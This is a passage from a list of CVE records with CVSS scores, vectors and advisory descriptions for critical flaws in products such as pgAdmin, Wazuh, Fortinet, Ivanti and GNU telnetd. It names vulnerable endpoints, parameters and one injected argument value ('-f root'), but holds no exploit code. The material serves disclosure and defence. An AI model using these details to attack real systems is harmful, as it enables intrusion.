| CVSS | `9.9` |
| Vector | `CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H` |
| Weaknesses | `N/A` |
| Published | 2025-04-03T12:23:14.792Z |

Remote Code Execution security vulnerability in pgAdmin 4  (Query Tool and Cloud Deployment modules).

The vulnerability is associated with the 2 POST endpoints; /sqleditor/query_tool/download, where the query_commited parameter and /cloud/deploy endpoint, where the high_availability parameter is unsafely passed to the Python eval() function, allowing arbitrary code execution.


This issue affects pgAdmin 4: before 9.2.

### CVE-2025-24016

| 項目 | 値 |
|------|-----|
| CVSS | `9.9` |
| Vector | `CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:L/I:H/A:H` |
| Weaknesses | `CWE-502` |
| Published | 2025-02-10T19:08:09.058Z |

Wazuh is a free and open source platform used for threat prevention, detection, and response. Starting in version 4.4.0 and prior to version 4.9.1, an unsafe deserialization vulnerability allows for remote code execution on Wazuh servers. DistributedAPI parameters are a serialized as JSON and deserialized using `as_wazuh_object` (in `framework/wazuh/core/cluster/common.py`). If an attacker manages to inject an unsanitized dictionary in DAPI request/response, they can forge an unhandled exception (`__unhandled_exc__`) to evaluate arbitrary python code. The vulnerability can be triggered by anybody with API access (compromised dashboard or Wazuh servers in the cluster) or, in certain configurations, even by a compromised agent. Version 4.9.1 contains a fix.

### CVE-2024-42327

| 項目 | 値 |
|------|-----|
| CVSS | `9.9` |
| Vector | `CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H` |
| Weaknesses | `CWE-89` |
| Published | 2024-11-27T12:04:31.950Z |

A non-admin user account on the Zabbix frontend with the default User role, or with any other role that gives API access can exploit this vulnerability. An SQLi exists in the CUser class in the addRelatedObjects function, this function is being called from the CUser.get function which is available for every user who has API access.

### CVE-2024-9463

| 項目 | 値 |
|------|-----|
| CVSS | `9.9` |
| Vector | `CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:H/VA:H/SC:H/SI:N/SA:N/AU:N/R:U/V:C/RE:H/U:Amber` |
| Weaknesses | `CWE-78` |
| Published | 2024-10-09T17:03:12.012Z |

An OS command injection vulnerability in Palo Alto Networks Expedition allows an unauthenticated attacker to run arbitrary OS commands as root in Expedition, resulting in disclosure of usernames, cleartext passwords, device configurations, and device API keys of PAN-OS firewalls.

### CVE-2024-1800

| 項目 | 値 |
|------|-----|
| CVSS | `9.9` |
| Vector | `CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H` |
| Weaknesses | `CWE-502` |
| Published | 2024-03-20T13:11:41.461Z |


In Progress® Telerik® Report Server versions prior to 2024 Q1 (10.0.24.130), a remote code execution attack is possible through an insecure deserialization vulnerability.

### CVE-2020-3495

| 項目 | 値 |
|------|-----|
| CVSS | `9.9` |
| Vector | `CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H` |
| Weaknesses | `CWE-20` |
| Published | 2020-09-04T02:25:52.219Z |

A vulnerability in Cisco Jabber for Windows could allow an authenticated, remote attacker to execute arbitrary code. The vulnerability is due to improper validation of message contents. An attacker could exploit this vulnerability by sending specially crafted Extensible Messaging and Presence Protocol (XMPP) messages to the affected software. A successful exploit could allow the attacker to cause the application to execute arbitrary programs on the targeted system with the privileges of the user account that is running the Cisco Jabber client software, possibly resulting in arbitrary code execution.

### CVE-2018-18809

| 項目 | 値 |
|------|-----|
| CVSS | `9.9` |
| Vector | `CVSS:3.0/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H` |
| Weaknesses | `N/A` |
| Published | 2019-03-07T22:00:00.000Z |

The default server implementation of TIBCO Software Inc.'s TIBCO JasperReports Library, TIBCO JasperReports Library Community Edition, TIBCO JasperReports Library for ActiveMatrix BPM, TIBCO JasperReports Server, TIBCO JasperReports Server Community Edition, TIBCO JasperReports Server for ActiveMatrix BPM, TIBCO Jaspersoft for AWS with Multi-Tenancy, and TIBCO Jaspersoft Reporting and Analytics for AWS contains a directory-traversal vulnerability that may theoretically allow web server users to access contents of the host system. Affected releases are TIBCO Software Inc.'s TIBCO JasperReports Library: versions up to and including 6.3.4; 6.4.1; 6.4.2; 6.4.21; 7.1.0; 7.2.0, TIBCO JasperReports Library Community Edition: versions up to and including 6.7.0, TIBCO JasperReports Library for ActiveMatrix BPM: versions up to and including 6.4.21, TIBCO JasperReports Server: versions up to and including 6.3.4; 6.4.0; 6.4.1; 6.4.2; 6.4.3; 7.1.0, TIBCO JasperReports Server Community Edition: versions up to and including 6.4.3; 7.1.0, TIBCO JasperReports Server for ActiveMatrix BPM: versions up to and including 6.4.3, TIBCO Jaspersoft for AWS with Multi-Tenancy: versions up to and including 7.1.0, TIBCO Jaspersoft Reporting and Analytics for AWS: versions up to and including 7.1.0.

### CVE-2026-7664

| 項目 | 値 |
|------|-----|
| CVSS | `9.8` |
| Vector | `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H` |
| Weaknesses | `CWE-287` |
| Published | 2026-06-22T16:16:41.880 |

IBM Langflow OSS 1.0.0 through 1.8.4 could allow unauthenticated attackers to access protected MCP project resources and execute MCP operations due to improper authorization enforcement in the Streamable MCP transport endpoint.

### CVE-2026-33824

| 項目 | 値 |
|------|-----|
| CVSS | `9.8` |
| Vector | `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H/E:U/RL:O/RC:C` |
| Weaknesses | `CWE-415` |
| Published | 2026-04-14T16:58:45.469Z |

Double free in Windows IKE Extension allows an unauthorized attacker to execute code over a network.

### CVE-2026-33032

| 項目 | 値 |
|------|-----|
| CVSS | `9.8` |
| Vector | `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H` |
| Weaknesses | `CWE-306` |
| Published | 2026-03-30T17:58:42.159Z |

Nginx UI is a web user interface for the Nginx web server. In versions 2.3.5 and prior, the nginx-ui MCP (Model Context Protocol) integration exposes two HTTP endpoints: /mcp and /mcp_message. While /mcp requires both IP whitelisting and authentication (AuthRequired() middleware), the /mcp_message endpoint only applies IP whitelisting - and the default IP whitelist is empty, which the middleware treats as "allow all". This means any network attacker can invoke all MCP tools without authentication, including restarting nginx, creating/modifying/deleting nginx configuration files, and triggering automatic config reloads - achieving complete nginx service takeover. At time of publication, there are no publicly available patches.

### CVE-2026-1281

| 項目 | 値 |
|------|-----|
| CVSS | `9.8` |
| Vector | `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H` |
| Weaknesses | `CWE-94` |
| Published | 2026-01-29T21:31:17.041Z |

A code injection in Ivanti Endpoint Manager Mobile allowing attackers to achieve unauthenticated remote code execution.

### CVE-2025-40551

| 項目 | 値 |
|------|-----|
| CVSS | `9.8` |
| Vector | `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H` |
| Weaknesses | `CWE-502` |
| Published | 2026-01-28T07:33:09.603Z |

SolarWinds Web Help Desk was found to be susceptible to an untrusted data deserialization vulnerability that could lead to remote code execution, which would allow an attacker to run commands on the host machine. This could be exploited without authentication.

### CVE-2026-24061

| 項目 | 値 |
|------|-----|
| CVSS | `9.8` |
| Vector | `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H` |
| Weaknesses | `CWE-88` |
| Published | 2026-01-21T06:42:17.134Z |

telnetd in GNU Inetutils through 2.7 allows remote authentication bypass via a "-f root" value for the USER environment variable.

### CVE-2024-32641

| 項目 | 値 |
|------|-----|
| CVSS | `9.8` |
| Vector | `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H` |
| Weaknesses | `CWE-94` |
| Published | 2025-12-03T16:26:00.795Z |

Masa CMS is an open source Enterprise Content Management platform. Masa CMS versions prior to 7.2.8, 7.3.13, and 7.4.6 are vulnerable to remote code execution. The vulnerability exists in the addParam function, which accepts user input via the criteria parameter. This input is subsequently evaluated by setDynamicContent, allowing an unauthenticated attacker to execute arbitrary code via the m tag. The vulnerability is patched in versions 7.2.8, 7.3.13, and 7.4.6.

### CVE-2025-12463

| 項目 | 値 |
|------|-----|
| CVSS | `9.8` |
| Vector | `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H` |
| Weaknesses | `CWE-89` |
| Published | 2025-11-03T16:45:39.423Z |

An unauthenticated SQL Injection was discovered within the Geutebruck G-Cam E-Series Cameras through the `Group` parameter in the `/uapi-cgi/viewer/Param.cgi` script. This has been confirmed on the EFD-2130 camera running firmware version 1.12.0.19.

### CVE-2025-11833

| 項目 | 値 |
|------|-----|
| CVSS | `9.8` |
| Vector | `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H` |
| Weaknesses | `CWE-862` |
| Published | 2025-11-01T03:34:35.794Z |

The Post SMTP – Complete SMTP Solution with Logs, Alerts, Backup SMTP & Mobile App plugin for WordPress is vulnerable to unauthorized access of data due to a missing capability check on the __construct function in all versions up to, and including, 3.6.0. This makes it possible for unauthenticated attackers to read arbitrary logged emails sent through the Post SMTP plugin, including password reset emails containing password reset links, which can lead to account takeover.

### CVE-2025-61757

| 項目 | 値 |
|------|-----|
| CVSS | `9.8` |
| Vector | `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H` |
| Weaknesses | `N/A` |
| Published | 2025-10-21T20:03:11.303Z |

Vulnerability in the Identity Manager product of Oracle Fusion Middleware (component: REST WebServices).  Supported versions that are affected are 12.2.1.4.0 and  14.1.2.1.0. Easily exploitable vulnerability allows unauthenticated attacker with network access via HTTP to compromise Identity Manager.  Successful attacks of this vulnerability can result in takeover of Identity Manager. CVSS 3.1 Base Score 9.8 (Confidentiality, Integrity and Availability impacts).  CVSS Vector: (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H).

### CVE-2025-59287

| 項目 | 値 |
|------|-----|
| CVSS | `9.8` |
| Vector | `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H/E:P/RL:O/RC:C` |
| Weaknesses | `CWE-502` |
| Published | 2025-10-14T17:01:47.629Z |

Deserialization of untrusted data in Windows Server Update Service allows an unauthorized attacker to execute code over a network.

### CVE-2025-58434

| 項目 | 値 |
|------|-----|
| CVSS | `9.8` |
| Vector | `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H` |
| Weaknesses | `CWE-306` |
| Published | 2025-09-12T17:37:08.190Z |

Flowise is a drag & drop user interface to build a customized large language model flow. In version 3.0.5 and earlier, the `forgot-password` endpoint in Flowise returns sensitive information including a valid password reset `tempToken` without authentication or verification. This enables any attacker to generate a reset token for arbitrary users and directly reset their password, leading to a complete account takeover (ATO). This vulnerability applies to both the cloud service (`cloud.flowiseai.com`) and self-hosted/local Flowise deployments that expose the same API. Commit 9e178d68873eb876073846433a596590d3d9c863 in version 3.0.6 secures password reset endpoints. Several recommended remediation steps are available. Do not return reset tokens or sensitive account details in API responses. Tokens must only be delivered securely via the registered email channel. Ensure `forgot-password` responds with a generic success message regardless of input, to avoid user enumeration. Require strong validation of the `tempToken` (e.g., single-use, short expiry, tied to request origin, validated against email delivery). Apply the same fixes to both cloud and self-hosted/local deployments. Log and monitor password reset requests for suspicious activity. Consider multi-factor verification for sensitive accounts.

### CVE-2025-25256

| 項目 | 値 |
|------|-----|
| CVSS | `9.8` |
| Vector | `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H/E:H/RL:X/RC:C` |
| Weaknesses | `CWE-78` |
| Published | 2025-08-12T18:59:14.863Z |

An improper neutralization of special elements used in an OS command ('OS Command Injection') vulnerability [CWE-78] in Fortinet FortiSIEM version 7.3.0 through 7.3.1, 7.2.0 through 7.2.5, 7.1.0 through 7.1.7, 7.0.0 through 7.0.3 and before 6.7.9 allows an unauthenticated attacker to execute unauthorized code or commands via crafted CLI requests.

### CVE-2024-32640

| 項目 | 値 |
|------|-----|
| CVSS | `9.8` |
| Vector | `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H` |
| Weaknesses | `CWE-89` |
| Published | 2025-08-11T20:38:56.268Z |

MASA CMS is an Enterprise Content Management platform based on open source technology. Versions prior to 7.4.5, 7.3.12, and 7.2.7 contain a SQL injection vulnerability in the `processAsyncObject` method that can result in remote code execution. Versions 7.4.5, 7.3.12, and 7.2.7 contain a fix for the issue.

### CVE-2025-49533

| 項目 | 値 |
|------|-----|
| CVSS | `9.8` |
| Vector | `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H` |
| Weaknesses | `CWE-502` |
| Published | 2025-07-08T21:32:12.973Z |

Adobe Experience Manager (MS) versions 6.5.23.0 and earlier are affected by a Deserialization of Untrusted Data vulnerability that could lead to arbitrary code execution by an attacker. Exploitation of this issue does not require user interaction. Scope is unchanged.

### CVE-2025-3248

| 項目 | 値 |
|------|-----|
| CVSS | `9.8` |
| Vector | `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H` |
| Weaknesses | `CWE-306` |
| Published | 2025-04-07T14:22:38.980Z |

Langflow versions prior to 1.3.0 are susceptible to code injection in 
the /api/v1/validate/code endpoint. A remote and unauthenticated attacker can send crafted HTTP requests to execute arbitrary
code.

### CVE-2025-27520

| 項目 | 値 |
|------|-----|
| CVSS | `9.8` |
| Vector | `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H` |
| Weaknesses | `CWE-502` |
| Published | 2025-04-04T14:28:51.574Z |

BentoML is a Python library for building online serving systems optimized for AI apps and model inference. A Remote Code Execution (RCE) vulnerability caused by insecure deserialization has been identified in the latest version (v1.4.2) of BentoML. It allows any unauthenticated user to execute arbitrary code on the server. It exists an unsafe code segment in serde.py. This vulnerability is fixed in 1.4.3.

### CVE-2025-31161

| 項目 | 値 |
|------|-----|
| CVSS | `9.8` |
| Vector | `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H` |
| Weaknesses | `CWE-305` |
| Published | 2025-04-03T00:00:00.000Z |

CrushFTP 10 before 10.8.4 and 11 before 11.3.1 allows authentication bypass and takeover of the crushadmin account (unless a DMZ proxy instance is used), as exploited in the wild in March and April 2025, aka "Unauthenticated HTTP(S) port access." A race condition exists in the AWS4-HMAC (compatible with S3) authorization method of the HTTP component of the FTP server. The server first verifies the existence of the user by performing a call to login_user_pass() with no password requirement. This will authenticate the session through the HMAC verification process and up until the server checks for user verification once more. The vulnerability can be further stabilized, eliminating the need for successfully triggering a race condition, by sending a mangled AWS4-HMAC header. By providing only the username and a following slash (/), the server will successfully find a username, which triggers the successful anypass authentication process, but the server will fail to find the expected SignedHeaders entry, resulting in an index-out-of-bounds error that stops the code from reaching the session cleanup. Together, these issues make it trivial to authenticate as any known or guessable user (e.g., crushadmin), and can lead to a full compromise of the system by obtaining an administrative account.

### CVE-2025-2747

| 項目 | 値 |
|------|-----|
| CVSS | `9.8` |
| Vector | `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H` |
| Weaknesses | `CWE-288` |
| Published | 2025-03-24T18:17:06.079Z |

An authentication bypass vulnerability in Kentico Xperience allows authentication bypass via the Staging Sync Server component password handling for the server defined None type. Authentication bypass allows an attacker to control administrative objects.This issue affects Xperience through 13.0.178.

### CVE-2025-2746

| 項目 | 値 |
|------|-----|
| CVSS | `9.8` |
| Vector | `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H` |
| Weaknesses | `CWE-288` |
| Published | 2025-03-24T18:16:04.022Z |

An authentication bypass vulnerability in Kentico Xperience allows authentication bypass via the Staging Sync Server password handling of empty SHA1 usernames in digest authentication. Authentication bypass allows an attacker to control administrative objects.This issue affects Xperience through 13.0.172.

### CVE-2025-0890

| 項目 | 値 |
|------|-----|
| CVSS | `9.8` |
| Vector | `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H` |
| Weaknesses | `CWE-287` |
| Published | 2025-02-04T10:06:56.163Z |

**UNSUPPORTED WHEN ASSIGNED**
Insecure default credentials for the Telnet function in the legacy DSL CPE Zyxel VMG4325-B10A firmware version 1.00(AAFR.4)C0_20170615 could allow an attacker to log in to the management interface if the administrators have the option to change the default credentials but fail to do so.

### CVE-2024-13159

| 項目 | 値 |
|------|-----|
| CVSS | `9.8` |
| Vector | `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H` |
| Weaknesses | `CWE-36` |
| Published | 2025-01-14T17:12:57.652Z |

Absolute path traversal in Ivanti EPM before the 2024 January-2025 Security Update and 2022 SU6 January-2025 Security Update allows a remote unauthenticated attacker to leak sensitive information.

### CVE-2024-12847

| 項目 | 値 |
|------|-----|
| CVSS | `9.8` |
| Vector | `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H` |
| Weaknesses | `CWE-78;CWE-306` |
| Published | 2025-01-10T19:36:36.675Z |

NETGEAR DGN1000 before 1.1.00.48 is vulnerable to an authentication bypass vulnerability. A remote and unauthenticated attacker can execute arbitrary operating system commands as root by sending crafted HTTP requests to the setup.cgi endpoint. This vulnerability has been observed to be exploited in the wild since at least 2017 and specifically by the Shadowserver Foundation on 2025-02-06 UTC.

### CVE-2024-11680

| 項目 | 値 |
|------|-----|
| CVSS | `9.8` |
| Vector | `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H` |
| Weaknesses | `CWE-306` |
| Published | 2024-11-26T09:55:23.588Z |

ProjectSend versions prior to r1720 are affected by an improper authentication vulnerability. Remote, unauthenticated attackers can exploit this flaw by sending crafted HTTP requests to options.php, enabling unauthorized modification of the application's configuration. Successful exploitation allows attackers to create accounts, upload webshells, and embed malicious JavaScript.

### CVE-2024-47575

| 項目 | 値 |
|------|-----|
| CVSS | `9.8` |
| Vector | `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H/E:H/RL:U/RC:C` |
| Weaknesses | `CWE-306` |
| Published | 2024-10-23T15:03:48.798Z |

A missing authentication for critical function in FortiManager 7.6.0, FortiManager 7.4.0 through 7.4.4, FortiManager 7.2.0 through 7.2.7, FortiManager 7.0.0 through 7.0.12, FortiManager 6.4.0 through 6.4.14, FortiManager 6.2.0 through 6.2.12, Fortinet FortiManager Cloud 7.4.1 through 7.4.4, FortiManager Cloud 7.2.1 through 7.2.7, FortiManager Cloud 7.0.1 through 7.0.12, FortiManager Cloud 6.4.1 through 6.4.7 allows attacker to execute arbitrary code or commands via specially crafted requests.

### CVE-2024-44000

| 項目 | 値 |
|------|-----|
| CVSS | `9.8` |
| Vector | `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H` |
| Weaknesses | `CWE-522` |
| Published | 2024-10-20T11:26:22.948Z |

Insufficiently Protected Credentials vulnerability in LiteSpeed Technologies LiteSpeed Cache litespeed-cache allows Authentication Bypass.This issue affects LiteSpeed Cache: from n/a through < 6.5.0.1.

### CVE-2024-43468

| 項目 | 値 |
|------|-----|
| CVSS | `9.8` |
| Vector | `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H/E:U/RL:O/RC:C` |
| Weaknesses | `CWE-89` |
| Published | 2024-10-08T17:35:48.428Z |

Microsoft Configuration Manager Remote Code Execution Vulnerability

### CVE-2024-20439

| 項目 | 値 |
|------|-----|
| CVSS | `9.8` |
| Vector | `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H` |
| Weaknesses | `CWE-912` |
| Published | 2024-09-04T16:28:39.669Z |

A vulnerability in Cisco Smart Licensing Utility (CSLU) could allow an unauthenticated, remote attacker to log into an affected system by using a static administrative credential.
 This vulnerability is due to an undocumented static user credential for an administrative account. An attacker could exploit this vulnerability by using the static credentials to login to the affected system. A successful exploit could allow the attacker to login to the affected system with administrative rights over the CSLU application API.

### CVE-2024-6670

| 項目 | 値 |
|------|-----|
| CVSS | `9.8` |
| Vector | `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H` |
| Weaknesses | `CWE-89` |
| Published | 2024-08-29T22:04:41.139Z |

In WhatsUp Gold versions released before 2024.0.0, a SQL Injection vulnerability allows an unauthenticated attacker to retrieve the users encrypted password.

### CVE-2024-6633

| 項目 | 値 |
|------|-----|
| CVSS | `9.8` |
| Vector | `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H` |
| Weaknesses | `CWE-200;CWE-798` |
| Published | 2024-08-27T14:11:24.527Z |

The default credentials for the setup HSQL database (HSQLDB) for FileCatalyst Workflow are published in a vendor knowledgebase article. Misuse of these credentials could lead to a compromise of confidentiality, integrity, or availability of the software.

The HSQLDB is only included to facilitate installation, has been deprecated, and is not intended for production use per vendor guides. However, users who have not configured FileCatalyst Workflow to use an alternative database per recommendations are vulnerable to attack from any source that can reach the HSQLDB.

### CVE-2024-7593

| 項目 | 値 |
|------|-----|
| CVSS | `9.8` |
| Vector | `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H` |
| Weaknesses | `CWE-287;CWE-303` |
| Published | 2024-08-13T18:17:47.248Z |

Incorrect implementation of an authentication algorithm in Ivanti vTM other than versions 22.2R1 or 22.7R2 allows a remote unauthenticated attacker to bypass authentication of the admin panel.

### CVE-2024-38063

| 項目 | 値 |
|------|-----|
| CVSS | `9.8` |
| Vector | `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H/E:U/RL:O/RC:C` |
| Weaknesses | `CWE-191` |
| Published | 2024-08-13T17:29:58.392Z |

Windows TCP/IP Remote Code Execution Vulnerability

### CVE-2024-41730

| 項目 | 値 |
|------|-----|
| CVSS | `9.8` |
| Vector | `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H` |
| Weaknesses | `CWE-862` |
| Published | 2024-08-13T03:31:37.327Z |

In SAP BusinessObjects Business Intelligence
Platform, if Single Signed On is enabled on Enterprise authentication, an
unauthorized user can get a logon token using a REST endpoint. The attacker can
fully compromise the system resulting in High impact on confidentiality,
integrity and availability.

### CVE-2024-41660

| 項目 | 値 |
|------|-----|
| CVSS | `9.8` |
| Vector | `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H` |
| Weaknesses | `CWE-120` |
| Published | 2024-07-31T19:37:46.455Z |

slpd-lite is a unicast SLP UDP server. Any OpenBMC system that includes the slpd-lite package is impacted. Installing this package is the default when building OpenBMC. Nefarious users can send slp packets to the BMC using UDP port 427 to cause memory overflow issues within the slpd-lite daemon on the BMC. Patches will be available in the latest openbmc/slpd-lite repository.

### CVE-2024-36435

| 項目 | 値 |
|------|-----|
| CVSS | `9.8` |
| Vector | `CVSS:3.1/AC:L/AV:N/A:H/C:H/I:H/PR:N/S:U/UI:N` |
| Weaknesses | `N/A` |
| Published | 2024-07-11T00:00:00.000Z |

An issue was discovered on Supermicro BMC firmware in select X11, X12, H12, B12, X13, H13, and B13 motherboards (and CMM6 modules). An unauthenticated user can post crafted data to the interface that triggers a stack buffer overflow, and may lead to arbitrary remote code execution on a BMC.

### CVE-2024-36401

| 項目 | 値 |
|------|-----|
| CVSS | `9.8` |
| Vector | `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H` |
| Weaknesses | `CWE-95` |
| Published | 2024-07-01T15:25:41.873Z |

GeoServer is an open source server that allows users to share and edit geospatial data. Prior to versions 2.22.6, 2.23.6, 2.24.4, and 2.25.2, multiple OGC request parameters allow Remote Code Execution (RCE) by unauthenticated users through specially crafted input against a default GeoServer installation due to unsafely evaluating property names as XPath expressions.

The GeoTools library API that GeoServer calls evaluates property/attribute names for feature types in a way that unsafely passes them to the commons-jxpath library which can execute arbitrary code when evaluating XPath expressions. This XPath evaluation is intended to be used only by complex feature types (i.e., Application Schema data stores) but is incorrectly being applied to simple feature types as well which makes this vulnerability apply to **ALL** GeoServer instances. No public PoC is provided but this vulnerability has been confirmed to be exploitable through WFS GetFeature, WFS GetPropertyValue, WMS GetMap, WMS GetFeatureInfo, WMS GetLegendGraphic and WPS Execute requests. This vulnerability can lead to executing arbitrary code.

Versions 2.22.6, 2.23.6, 2.24.4, and 2.25.2 contain a patch for the issue. A workaround exists by removing the `gt-complex-x.y.jar` file from the GeoServer where `x.y` is the GeoTools version (e.g., `gt-complex-31.1.jar` if running GeoServer 2.25.1). This will remove the vulnerable code from GeoServer but may break some GeoServer functionality or prevent GeoServer from deploying if the gt-complex module is needed.

### CVE-2024-4885

| 項目 | 値 |
|------|-----|
| CVSS | `9.8` |
| Vector | `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H` |
| Weaknesses | `CWE-22` |
| Published | 2024-06-25T19:48:15.268Z |

In WhatsUp Gold versions released before 2023.1.3, an unauthenticated Remote Code Execution vulnerability in Progress WhatsUpGold.  The 

WhatsUp.ExportUtilities.Export.GetFileWithoutZip



 allows execution of commands with iisapppool\nmconsole privileges.

### CVE-2024-4883

| 項目 | 値 |
|------|-----|
| CVSS | `9.8` |
| Vector | `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H` |
| Weaknesses | `CWE-77;CWE-78;CWE-94` |
| Published | 2024-06-25T19:44:42.139Z |

In WhatsUp Gold versions released before 2023.1.3, a Remote Code Execution issue exists in Progress WhatsUp Gold. This vulnerability allows an unauthenticated attacker to achieve the RCE as a service account through NmApi.exe.

### CVE-2024-5276

| 項目 | 値 |
|------|-----|
| CVSS | `9.8` |
| Vector | `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H` |
| Weaknesses | `CWE-20;CWE-89` |
| Published | 2024-06-25T19:13:54.585Z |

A SQL Injection vulnerability in Fortra FileCatalyst Workflow allows an attacker to modify application data.  Likely impacts include creation of administrative users and deletion or modification of data in the application database. Data exfiltration via SQL injection is not possible using this vulnerability. Successful unauthenticated exploitation requires a Workflow system with anonymous access enabled, otherwise an authenticated user is required. This issue affects all versions of FileCatalyst Workflow from 5.1.6 Build 135 and earlier.

### CVE-2024-6047

| 項目 | 値 |
|------|-----|
| CVSS | `9.8` |
| Vector | `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H` |
| Weaknesses | `CWE-78` |
| Published | 2024-06-17T05:48:42.779Z |

Certain EOL GeoVision devices fail to properly filter user input for the specific functionality. Unauthenticated remote attackers can exploit this vulnerability to inject and execute arbitrary system commands on the device.

### CVE-2024-3080

| 項目 | 値 |
|------|-----|
| CVSS | `9.8` |
| Vector | `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H` |
| Weaknesses | `CWE-287` |
| Published | 2024-06-14T02:57:27.002Z |

Certain ASUS router models have authentication bypass vulnerability, allowing unauthenticated remote attackers to log in the device.

### CVE-2024-34102

| 項目 | 値 |
|------|-----|
| CVSS | `9.8` |
| Vector | `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H` |
| Weaknesses | `CWE-611` |
| Published | 2024-06-13T09:04:56.093Z |

Adobe Commerce versions 2.4.7, 2.4.6-p5, 2.4.5-p7, 2.4.4-p8 and earlier are affected by an Improper Restriction of XML External Entity Reference ('XXE') vulnerability that could result in arbitrary code execution. An attacker could exploit this vulnerability by sending a crafted XML document that references external entities. Exploitation of this issue does not require user interaction.

### CVE-2024-4577

| 項目 | 値 |
|------|-----|
| CVSS | `9.8` |
| Vector | `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H` |
| Weaknesses | `CWE-78` |
| Published | 2024-06-09T19:42:36.464Z |

In PHP versions 8.1.* before 8.1.29, 8.2.* before 8.2.20, 8.3.* before 8.3.8, when using Apache and PHP-CGI on Windows, if the system is set up to use certain code pages, Windows may use "Best-Fit" behavior to replace characters in command line given to Win32 API functions. PHP CGI module may misinterpret those characters as PHP options, which may allow a malicious user to pass options to PHP binary being run, and thus reveal the source code of scripts, run arbitrary PHP code on the server, etc.

### CVE-2024-3408

| 項目 | 値 |
|------|-----|
| CVSS | `9.8` |
| Vector | `CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H` |
| Weaknesses | `CWE-798` |
| Published | 2024-06-06T18:54:43.713Z |

man-group/dtale version 3.10.0 is vulnerable to an authentication bypass and remote code execution (RCE) due to improper input validation. The vulnerability arises from a hardcoded `SECRET_KEY` in the flask configuration, allowing attackers to forge a session cookie if authentication is enabled. Additionally, the application fails to properly restrict custom filter queries, enabling attackers to execute arbitrary code on the server by bypassing the restriction on the `/update-settings` endpoint, even when `enable_custom_filters` is not enabled. This vulnerability allows attackers to bypass authentication mechanisms and execute remote code on the server.

### CVE-2024-29974

| 項目 | 値 |
|------|-----|
| CVSS | `9.8` |
| Vector | `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H` |
| Weaknesses | `CWE-434` |
| Published | 2024-06-04T01:34:11.340Z |

** UNSUPPORTED WHEN ASSIGNED **
The remote code execution vulnerability in the CGI program “file_upload-cgi” in Zyxel NAS326 firmware versions before V5.21(AAZF.17)C0 and NAS542 firmware versions before V5.21(ABAG.14)C0 could allow an unauthenticated attacker to execute arbitrary code by uploading a crafted configuration file to a vulnerable device.

### CVE-2024-29973

| 項目 | 値 |
|------|-----|
| CVSS | `9.8` |
